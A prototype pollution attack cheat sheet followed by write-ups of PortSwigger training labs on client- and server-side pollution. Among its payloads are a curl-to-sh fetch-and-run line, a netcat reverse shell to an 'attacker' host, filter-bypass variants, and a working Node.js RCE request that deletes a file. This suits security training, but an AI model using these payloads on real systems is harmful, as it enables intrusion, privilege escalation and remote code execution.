# **✅ Prototype Pollution Attack – Complete Test Case (with Bypass Cases)**

# **1. List of Vulnerabilities**

1.1 Object Prototype Pollution

1.2 Constructor Prototype Pollution

1.3 Polluting Deep Nested Objects

1.4 DOM Prototype Pollution (Client-Side)

1.5 Server-Side Prototype Pollution (Node.js)

1.6 Bypass Shallow Key Filters

1.7 Polluting JSON Merge / Patch Endpoint

1.8 Pollution via Query Parameters

1.9 Escaping Input Sanitization

1.10 Advanced Payload Chains (Privilege Escalation / RCE)

# **2. Sample Payloads (Core Attack Payloads)**

*(Normal Structured Payloads)*

```
2.1 Basic Prototype Pollution
{"__proto__":{"polluted":true}}
```

```
2.2 Constructor Prototype Pollution
{"constructor":{"prototype":{"admin":true}}}
```

```
2.3 Deep Nested Pollution
{"a":{"b":{"__proto__":{"isAdmin":1}}}}
```

```
2.4 Pollute Global Object.prototype
{"prototype":{"debug":"enabled"}}
```

```
2.5 Function Constructor Pollution
{"constructor":{"prototype":{"exploit":"yes"}}}
```

```
2.6 Array Prototype Pollution
{"__proto__":{"0":"malicious","length":9999}}
```

```
2.7 Query Parameter Pollution
?__proto__[admin]=true
```

```
2.8 JSON Patch Pollution
{"op":"add","path":"/__proto__/pwn","value":"x"}
```

```
2.9 Express.js Body Parser Pollution
?a[__proto__][admin]=1
```

```
2.10 Server Config Pollution
{"__proto__":{"cacheTTL":0}}
```

---

# **3. Sample Payloads (Updated With Real Offensive Payloads)**

*(Offensive prototype pollution payloads used for real attack chains)*

```
3.1 Node.js Command Execution Chain
{"__proto__":{"shell":"/bin/bash -c 'curl http://x/p.sh|sh'"}}
```

```
3.2 Privilege Escalation (User → Admin)
{"constructor":{"prototype":{"role":"admin"}}}
```

```
3.3 JWT Auth Bypass
{"__proto__":{"algorithms":["none"],"ignoreExpiration":true}}
```

```
3.4 Rate Limit Bypass
{"__proto__":{"rateLimit":0}}
```

```
3.5 DOM XSS via innerHTML Pollution
{"__proto__":{"innerHTML":"<img src=x onerror=alert(1)>"}}
```

```
3.6 Pollute Object.assign() Defaults
{"__proto__":{"overwrite":true}}
```

```
3.7 Path Traversal → File Write Exploit
{"__proto__":{"recursive":true}}
```

```
3.8 Disable Security Sanitizers
{"__proto__":{"sanitizeFilter":false}}
```

```
3.9 Password Policy Bypass
{"__proto__":{"minPasswordLength":1}}
```

```
3.10 CSRF Protection Disable
{"__proto__":{"csrfEnabled":false}}
```

---

# **4. Bypass Techniques (Filters, Sanitizers, WAF Evasion)**

*(Same style as Host Header / GraphQL bypass cases)*

```
4.1 Unicode Bypass
{"\u005f\u005fproto\u005f\u005f":{"admin":1}}
```

```
4.2 Double-Encoded Key Bypass
%5F%5Fproto%5F%5F[admin]=1
```

```
4.3 Mixed Case Bypass
{"__ProTo__":{"polluted":"yes"}}
```

```
4.4 Deep Nesting to Evade Shallow Filters
{"x":{"y":{"z":{"__proto__":{"pwn":"x"}}}}}
```

```
4.5 Array Injection Bypass
[{"__proto__":{"admin":true}}]
```

```
4.6 Dot-Notation Bypass
?__proto__.role=admin
```

```
4.7 Bracket-Notation Bypass
?__proto__[role]=admin
```

```
4.8 Encoded JSON Patch Bypass
{"op":"add","path":"\/__proto__\/\u0061","value":"pwn"}
```

```
4.9 Nested Constructor Override
{"a":{"constructor":{"prototype":{"hacked":1}}}}
```

```
4.10 Polluting via CSP-Bypass (Client-Side)
?__proto__[nonce]=fakeNonce
```

---

# **5. Advanced Attack Chains**

*(Prototype Pollution → XSS / RCE / Auth Bypass)*

```
5.1 Prototype Pollution → DOM XSS
?__proto__[innerHTML]=<img src=x onerror=alert(1337)>
```

```
5.2 Prototype Pollution → JWT "None" Bypass
{"__proto__":{"algorithms":["none"]}}
```

```
5.3 Prototype Pollution → Node RCE
{"__proto__":{"shell":"/bin/sh -c 'nc attacker 4444 -e /bin/sh'"}}
```

```
5.4 Prototype Pollution → NoSQL Injection
{"__proto__":{"sanitizeFilter":false}}
```

```
5.5 Prototype Pollution → Full Account Takeover
{"constructor":{"prototype":{"role":"superadmin"}}}
```

01 DOM XSS via client-side prototype pollution
===============================================
This lab is vulnerable to DOM XSS via client-side prototype pollution. To solve the lab:

Find a source that you can use to add arbitrary properties to the global Object.prototype.

Identify a gadget property that allows you to execute arbitrary JavaScript.

Combine these to call alert().

You can solve this lab manually in your browser, or use DOM Invader to help you.


---------------------------------------------

References: 

- https://portswigger.net/web-security/prototype-pollution/client-side



![img](images/DOM%20XSS%20via%20client-side%20prototype%20pollution/1.png)

---------------------------------------------

There are 2 scripts imported in the home page:



![img](images/DOM%20XSS%20via%20client-side%20prototype%20pollution/2.png)


File /resources/js/deparam.js:



![img](images/DOM%20XSS%20via%20client-side%20prototype%20pollution/3.png)


File /resources/js/searchLogger.js. This one is interesting for the “transport_url” value:



![img](images/DOM%20XSS%20via%20client-side%20prototype%20pollution/4.png)


We can search “/?\_\_proto\_\_[foo]=bar” and find there is a pollution:



![img](images/DOM%20XSS%20via%20client-side%20prototype%20pollution/5.png)


If we add the “transport_url” element from logger.js in a request to “/?\_\_proto\_\_[transport_url]=bar”, there is a request to “/bar”:





![img](images/DOM%20XSS%20via%20client-side%20prototype%20pollution/6.png)
![img](images/DOM%20XSS%20via%20client-side%20prototype%20pollution/7.png)

A payload like “/?\_\_proto\_\_[transport_url]="><script>alert(1)</script><x a="” does not work:



![img](images/DOM%20XSS%20via%20client-side%20prototype%20pollution/8.png)


If we search “/?\_\_proto\_\_[transport_url]=data:,alert(1);”:



![img](images/DOM%20XSS%20via%20client-side%20prototype%20pollution/9.png)

------------------------------

DOM Invader is an extension in Burp's browser:











![img](images/DOM%20XSS%20via%20client-side%20prototype%20pollution/10.png)
![img](images/DOM%20XSS%20via%20client-side%20prototype%20pollution/11.png)
![img](images/DOM%20XSS%20via%20client-side%20prototype%20pollution/12.png)
![img](images/DOM%20XSS%20via%20client-side%20prototype%20pollution/13.png)
![img](images/DOM%20XSS%20via%20client-side%20prototype%20pollution/14.png)



02 DOM XSS via an alternative prototype pollution vector
========================================================

This lab is vulnerable to DOM XSS via client-side prototype pollution. To solve
the lab:

Find a source that you can use to add arbitrary properties to the global
Object.prototype.

Identify a gadget property that allows you to execute arbitrary JavaScript.

Combine these to call alert().

You can solve this lab manually in your browser, or use DOM Invader to help you.

Hint: Pay attention to the XSS context. You need to adjust your payload slightly
to ensure that the JavaScript syntax remains valid following your injection.

References:

-   https://portswigger.net/web-security/prototype-pollution/client-side

![img](media/0d096ffcb24a43db99a2f1ea739b0a31.png)

There are some scripts imported when searching:

![img](media/8bacdc5a988e6164c2aaa3cfb77b24a2.png)

This is the file “/resources/js/searchLoggerAlternative.js”:

![img](media/ed649f7358281ff6edc10d3ae16b22af.png)

When accessing “/?search=aaa&__proto__.foo=bar”, Object.prototype has the field
“foo”:

![img](media/ab3e89377adcfb9fd90c64fa2c619f7a.png)

We can change it to “sequence” searching “/?search=aaa&__proto__.sequence=bar”.
There is a problem in the eval() function stating “bar1 does not exist”:

![img](media/90ce6f93fd49ea53854a062ca80b1560.png)

That is because of these lines:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
let a = manager.sequence || 1;
manager.sequence = a + 1;
eval('if(manager && manager.sequence){ manager.macro('+manager.sequence+') }');
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

It is necessary to add “-”, the request is
"/?search=aaa&__proto__.sequence=alert(1)-":

![img](media/7f16bcb093c8641ee07d142f7afb1466.png)

![img](media/763c3f90be3af9e0d835e1e5701da15e.png)

![img](media/b02d1cde69c85329f50cfa570be8fc33.png)

03 Client-side prototype pollution via flawed sanitization
==========================================================

This lab is vulnerable to DOM XSS via client-side prototype pollution. Although
the developers have implemented measures to prevent prototype pollution, these
can be easily bypassed.

To solve the lab:

Find a source that you can use to add arbitrary properties to the global
Object.prototype.

Identify a gadget property that allows you to execute arbitrary JavaScript.

Combine these to call alert().

References:

-   https://portswigger.net/web-security/prototype-pollution/client-side

![img](media/2aa266e5c1efa3ff3648293c7806b8cd.png)

There are two scripts imported in the home page:

![img](media/43df423e92b5a40b3bda550d690390dc.png)

This is “/resources/js/searchLoggerFiltered.js”. It suffers the same problem
that one previous lab with “transport_url”:

![img](media/04db297f6fc0b45940ca2cb6d1c5fe06.png)

Knowing the sanitization from the santizeKey() function, we can try a payload
like:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
/?__pro__proto__to__[transport_url]=bar
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

And the value in Object.prototype is correct:

![img](media/1706784ac16de0a8f3152a7dd5c399ee.png)

Finally:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
/?__pro__proto__to__[transport_url]=data:,alert(1);
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

![img](media/ca8bf3d56d761d7500c5425cd9bb2bc4.png)

04 Client-side prototype pollution in third-party libraries
=============================================================

This lab is vulnerable to DOM XSS via client-side prototype pollution. This is due to a gadget in a third-party library, which is easy to miss due to the minified source code. Although it's technically possible to solve this lab manually, we recommend using DOM Invader as this will save you a considerable amount of time and effort.

To solve the lab:

Use DOM Invader to identify a prototype pollution and a gadget for DOM XSS.

Use the provided exploit server to deliver a payload to the victim that calls alert(document.cookie) in their browser.

This lab is based on real-world vulnerabilities discovered by PortSwigger Research. For more details, check out Widespread prototype pollution gadgets by Gareth Heyes.


---------------------------------------------

References: 

- https://portswigger.net/web-security/prototype-pollution/client-side



![img](images/Client-side%20prototype%20pollution%20in%20third-party%20libraries/1.png)

---------------------------------------------

DOM Invader detects two sources:
 


![img](images/Client-side%20prototype%20pollution%20in%20third-party%20libraries/2.png)


In my case these two sources seem impossible to exploit.

There is a live chat where we can inject a payload in the form:



![img](images/Client-side%20prototype%20pollution%20in%20third-party%20libraries/3.png)


And DOM Invader detects a sink:



![img](images/Client-side%20prototype%20pollution%20in%20third-party%20libraries/4.png)


Finally it seems there is a gadget but my lab is not working right. The solution from Portswigger:


```
<script>
    location="https://0a65003104a4a2b382ec47a700530010.web-security-academy.net/#__proto__[hitCallback]=alert%28document.cookie%29"
</script>
```

05 Client-side prototype pollution via browser APIs
===================================================

This lab is vulnerable to DOM XSS via client-side prototype pollution. The
website's developers have noticed a potential gadget and attempted to patch it.
However, you can bypass the measures they've taken.

To solve the lab:

Find a source that you can use to add arbitrary properties to the global
Object.prototype.

Identify a gadget property that allows you to execute arbitrary JavaScript.

Combine these to call alert().

You can solve this lab manually in your browser, or use DOM Invader to help you.

This lab is based on real-world vulnerabilities discovered by PortSwigger
Research. For more details, check out Widespread prototype pollution gadgets by
Gareth Heyes.

References:

-   https://portswigger.net/web-security/prototype-pollution/client-side/browser-apis

![img](media/e9f09c87aaf81ff189bbae92cee76c90.png)

![img](media/4746a53d57e231e571ff80e8ba0ebdd9.png)

\---------------------------------------------

There are 2 Javascripts scripts imported:

![img](media/9f269e483420aeda767e6f15f5093069.png)

File “/resources/js/searchLoggerConfigurable.js”:

![img](media/4d76972494d702157e1d1989b7960af7.png)

The developers used Object.defineProperty() to avoid parameter pollution. From
the notes, "Developers with some knowledge of prototype pollution may attempt to
block potential gadgets by using the Object.defineProperty() method. This
enables you to set a non-configurable, non-writable property directly on the
affected object as follows. (...) In this case, an attacker may be able to
bypass this defense by polluting Object.prototype with a malicious value
property. If this is inherited by the descriptor object passed to
Object.defineProperty(), the attacker-controlled value may be assigned to the
gadget property after all".

So instead of using “transport_url” we will use “value”:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
/?__proto__[value]=bar
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

![img](media/e6e15e0b1563609f2a8c9728be06428c.png)

And then execute an alert(1):

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
/?__proto__[value]=data:,alert(1)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

![img](media/126016b02c80baf665fbaf24b18c0d6f.png)

![img](media/7af575a86ddf256a90befadf7fcb3dc1.png)

![img](media/58613ddb4ac84c6dd85849f286825887.png)

The request is “/?**proto**[value]=data%3A%2Calert%281%29”:

![img](media/d599066db9a5dbc9f201db42d1e029ed.png)

06 Privilege escalation via server-side prototype pollution
===========================================================

This lab is built on Node.js and the Express framework. It is vulnerable to
server-side prototype pollution because it unsafely merges user-controllable
input into a server-side JavaScript object. This is simple to detect because any
polluted properties inherited via the prototype chain are visible in an HTTP
response.

To solve the lab:

-   Find a prototype pollution source that you can use to add arbitrary
    properties to the global Object.prototype.

-   Identify a gadget property that you can use to escalate your privileges.

-   Access the admin panel and delete the user carlos.

You can log in to your own account with the following credentials: wiener:peter

Note: When testing for server-side prototype pollution, it's possible to break
application functionality or even bring down the server completely. If this
happens to your lab, you can manually restart the server using the button
provided in the lab banner. Remember that you're unlikely to have this option
when testing real websites, so you should always use caution.

References:

-   https://portswigger.net/web-security/prototype-pollution/server-side

![img](media/87c26475b36dc8274f0641a54d3ca1ce.png)

![img](media/6de8d549f4a4804299f451df18c423a9.png)

The login credentials are sent inside a JSON object but the value is not
reflected:

It is possible to add data in the “update address” functionality:

It gets reflected:

In this page there is a Javascript script imported:

File “/resources/js/updateAddress.js”:

It is possible to update the “isAdmin” value even though it is not reflected in
the page (we see in the code it gets filtered):

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
POST /my-account/change-address HTTP/2
...

{"address_line_1":"Wiener HQ","address_line_2":"One Wiener Way","city":"Wienerville","postcode":"BU1 1RP","country":"UK","sessionId":"e6Z5ouDA9AodwILfR7nGgH2nYPtPLzyE","__proto__":{        "isAdmin":true    }}
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

07 Detecting server-side prototype pollution without polluted property reflection
=================================================================================

This lab is built on Node.js and the Express framework. It is vulnerable to
server-side prototype pollution because it unsafely merges user-controllable
input into a server-side JavaScript object.

To solve the lab, confirm the vulnerability by polluting Object.prototype in a
way that triggers a noticeable but non-destructive change in the server's
behavior. As this lab is designed to help you practice non-destructive detection
techniques, you don't need to progress to exploitation.

You can log in to your own account with the following credentials: wiener:peter

Note: When testing for server-side prototype pollution, it's possible to break
application functionality or even bring down the server completely. If this
happens to your lab, you can manually restart the server using the button
provided in the lab banner. Remember that you're unlikely to have this option
when testing real websites, so you should always use caution.

References:

-   https://portswigger.net/web-security/prototype-pollution/server-side

![img](media/f2c9016bdc59c93c619f5312fd8b0f1b.png)

![img](media/5eef7500b6cb1f494ee040e89343b39a.png)

![img](media/e3ea560ccbab902603ce1c4be4fe1c82.png)

![img](media/a44ac59d5c53ab703c4801d3ab767406.png)

It is possible to update the charset:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
POST /my-account/change-address HTTP/2
...

{"address_line_1":"Wiener HQ","address_line_2":"One Wiener Way","city":"Wienerville","postcode":"BU1 1RP","country":"+AGYAbwBv-","sessionId":"GBF3M0MGldLBwDhhruxk8a4GKGNX5ju0","__proto__":{"content-type": "application/json; charset=utf-7"}}
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

![img](media/9d1f18d958b5105c95ca474a2521dfba.png)

Now the value "+AGYAbwBv-" is interpreted as “foo”:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
POST /my-account/change-address HTTP/2
...

{"address_line_1":"+AGYAbwBv-","address_line_2":"+AGYAbwBv-","city":"+AGYAbwBv-","postcode":"+AGYAbwBv-","country":"+AGYAbwBv-","sessionId":"GBF3M0MGldLBwDhhruxk8a4GKGNX5ju0"}
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

![img](media/825d49c01a827130fa44c245c17a8d77.png)

08 Bypassing flawed input filters for server-side prototype pollution
=====================================================================

This lab is built on Node.js and the Express framework. It is vulnerable to
server-side prototype pollution because it unsafely merges user-controllable
input into a server-side JavaScript object.

To solve the lab:

-   Find a prototype pollution source that you can use to add arbitrary
    properties to the global Object.prototype.

-   Identify a gadget property that you can use to escalate your privileges.

-   Access the admin panel and delete the user carlos.

-   You can log in to your own account with the following credentials:
    wiener:peter

Note: When testing for server-side prototype pollution, it's possible to break
application functionality or even bring down the server completely. If this
happens to your lab, you can manually restart the server using the button
provided in the lab banner. Remember that you're unlikely to have this option
when testing real websites, so you should always use caution.

References:

-   https://portswigger.net/web-security/prototype-pollution/server-side

![img](media/dd1828252fc5e5ab40df6e7a110619ce.png)

After interacting with the application I launched the extension:

![img](media/51a4626b5baba878b204689a7fb36418.png)

It finds the vulnerability:

![img](media/9248c081a0fdbcab8e1fa682b2aad6ba.png)

It looks like the extension added many fields:

![img](media/a0c0789a6f3feaf382fe73d4f3ae8609.png)

In the update address page there is a Javascript script imported:

![img](media/95dd7fd50d410fe51fe9c33683ba0742.png)

File “/resources/js/updateAddress.js”:

![img](media/1614664e93721bca5130bd53f9d24cce.png)

We can change most values but not “isAdmin”. From the notes, "an attacker can
access the prototype via the constructor property instead of \__proto__"

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
POST /my-account/change-address HTTP/2
...

{"address_line_1":"Wiener HQ","address_line_2":"One Wiener Way","city":"Wienerville","postcode":"BU1 1RP","country":"UKKKKKK","sessionId":"PDKi3aQnLAV0M8OWcB6qLExhgub4zcGW","constructor":{"prototype":{"isAdmin":true}}}
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

![img](media/232aea2751d05b5b54de742d7eea1a1c.png)

09 Remote code execution via server-side prototype pollution
============================================================

This lab is built on Node.js and the Express framework. It is vulnerable to
server-side prototype pollution because it unsafely merges user-controllable
input into a server-side JavaScript object.

Due to the configuration of the server, it's possible to pollute
Object.prototype in such a way that you can inject arbitrary system commands
that are subsequently executed on the server.

To solve the lab:

-   Find a prototype pollution source that you can use to add arbitrary
    properties to the global Object.prototype.

-   Identify a gadget that you can use to inject and execute arbitrary system
    commands.

-   Trigger remote execution of a command that deletes the file
    /home/carlos/morale.txt.

In this lab, you already have escalated privileges, giving you access to admin
functionality. You can log in to your own account with the following
credentials: wiener:peter

Hint: The command execution sink is only invoked when an admin user triggers
vulnerable functionality on the site.

Note: When testing for server-side prototype pollution, it's possible to break
application functionality or even bring down the server completely. If this
happens to your lab, you can manually restart the server using the button
provided in the lab banner. Remember that you're unlikely to have this option
when testing real websites, so you should always use caution.

References:

-   https://portswigger.net/web-security/prototype-pollution/server-side

-   https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution/prototype-pollution-to-rce

![img](media/9e4a03fcc364d9602a24107b27971e5f.png)

First I set the “shell” and “NODE_OPTIONS” properties so any time a process is
created there is a DNS request to a Burp collaborator domain:

![img](media/d6a6cfec20a54c0ccc769cb443394332.png)

In /admin, click “Run maintenance jobs”:

![img](media/a0e802d427119c0a9d70858585f82e2a.png)

And the domain is resolved:

![img](media/62cd17123f7c419886205c20f83fafca.png)

After some trial and error I could execute a command to delete the file with
this payload:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
POST /my-account/change-address HTTP/2

{"address_line_1":"Wiener HQ","address_line_2":"One Wiener Way","city":"Wienerville","postcode":"BU1 1RP","country":"UK","sessionId":"9w2wz2qtX8He4ofWjxuo5Lv3cGj49UjN","__proto__": {  "shell":"",    "NODE_OPTIONS": "--require /proc/self/cmdline", "argv0": "console.log(require(\"child_process\").execSync(\"rm /home/carlos/morale.txt\").toString())//"}}
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

![img](media/1ab8d4296c5fdcdba613e91b65ce2fae.png)

